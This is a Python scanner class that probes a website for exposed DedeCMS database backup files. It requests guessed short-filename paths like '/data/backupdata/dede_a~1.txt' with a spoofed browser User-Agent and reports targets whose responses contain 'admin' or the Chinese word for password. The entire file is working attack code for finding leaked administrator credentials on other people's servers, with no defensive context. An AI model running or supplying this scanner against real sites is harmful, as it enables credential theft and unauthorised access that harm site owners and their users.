import requests
from termcolor import cprint


class shortpath:

    def __init__(self,url):
        self.url = url

    def shortpath(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ['/data/backupdata/dede_h~', '/data/backupdata/dede_m~', '/data/backupdata/dede_p~',
                    '/data/backupdata/dede_a~', '/data/backupdata/dede_s~']
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        try:
            for payload in payloads:
                for number in range(1, 5):
                    testurl = url.strip() + payload + str(number) + ".txt"
                    r = requests.get(url=testurl,headers=headers)
                    html = r.text
                    if r.status_code == 200 and ("admin" in html or "密码" in html):
                        cprint("dede databak is vulnable" + testurl,"red")
        except:
            return False

